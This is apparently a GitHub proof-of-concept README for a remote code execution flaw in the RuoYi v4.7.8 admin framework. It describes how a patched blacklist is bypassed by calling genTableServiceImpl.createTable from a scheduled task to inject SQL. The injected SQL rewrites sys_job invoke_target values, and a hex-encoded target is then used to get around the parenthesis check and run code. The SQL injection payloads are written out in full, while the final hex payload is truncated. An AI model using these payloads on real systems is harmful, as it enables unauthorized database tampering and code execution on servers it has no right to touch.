# RuoYi-v4.7.8-RCE-POC

The system had vulnerabilities in the scheduled tasks before, and now I bypass it.

### Sqli

In the patch, a strategy using blacklisting and whitelisting was employed.

![截屏2024-02-25 15.22.37](images/%E6%88%AA%E5%B1%8F2024-02-25%2015.22.37.png)

However, I managed to bypass it by using a whitelist class and successfully carried out an SQL injection.

```Java
genTableServiceImpl.createTable('SELECT 1 FROM 'Hack By 1ue';')
```

![img](images/(null)-20240225151808087.(null))

```Java
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 'Hack By 1ue' WHERE job_id = 1;')
```

![img](images/(null)-20240225151808048.(null))

success to change the data of table `job_id`

### RCE

`JobInvokeUtil`does not allow parentheses in the string during invocation, so I modified the parameter value of a specific job in the original job table to hexadecimal (bypassing defense detection), enabling another scheduled task for Remote Code Execution (RCE).

![img](images/(null))

```Java
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6a61... WHERE job_id = 2;')
```

![截屏2024-02-25 15.18.34](images/%E6%88%AA%E5%B1%8F2024-02-25%2015.18.34.png)

the job's invoke_target changed

![img](images/(null)-20240225151808261.(null))

and then execute!
